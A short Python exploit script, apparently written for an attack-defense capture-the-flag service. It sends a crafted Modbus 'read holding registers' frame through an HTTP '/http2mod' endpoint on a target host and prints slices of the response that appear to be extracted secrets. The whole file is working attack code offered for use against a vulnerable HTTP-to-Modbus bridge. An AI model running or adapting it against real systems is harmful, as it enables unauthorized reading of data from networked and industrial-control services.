#!/usr/bin/env python3
import argparse, requests

#START ME LIKE ./1.py 127.0.0.1 8181

def http2mod(ip, port, start, quantity):
    message = bytes.fromhex("0001000000060103" + ("%0.4X" % start) + ("%0.4X" % quantity))
    try:
        r = requests.post(f'http://{ip}:{port}/http2mod',data=message)
        data = r.text
        print(data[9+0*17*2+8:9+0*17*2+6+34])
        print(data[9+1*17*2+8:9+1*17*2+6+34])
        print(data[9+2*17*2+8:9+2*17*2+6+34])
        print(data[9+3*17*2+8:9+3*17*2+6+34])
        print(data[9+4*17*2+8:9+4*17*2+6+34])
        print(data[9+5*17*2+8:9+5*17*2+6+34])
        print(data[9+6*17*2+8:9+6*17*2+6+34])
    except Exception as e:
        print(e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit the second vulnerability http2mod")
    parser.add_argument("ip", help="vulnerable host ip passed here")
    parser.add_argument("port", help="port to web")
    args = parser.parse_args()
    http2mod(args.ip, int(args.port), 0, 125)
